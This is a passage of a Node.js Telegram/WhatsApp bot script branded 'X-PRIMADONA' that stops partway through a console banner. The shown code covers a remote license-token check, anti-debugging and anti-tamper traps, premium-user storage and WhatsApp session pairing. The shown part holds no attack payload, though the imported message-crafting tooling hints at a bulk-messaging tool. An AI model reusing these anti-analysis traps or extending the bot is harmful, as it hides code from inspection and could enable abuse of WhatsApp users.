const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/ZyuuKnowxy/xsockers/refs/heads/main/token.json';
const thumbnailUrl = "https://kommodo.ai/i/1k0yxS3ortjZtsH6jItt";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
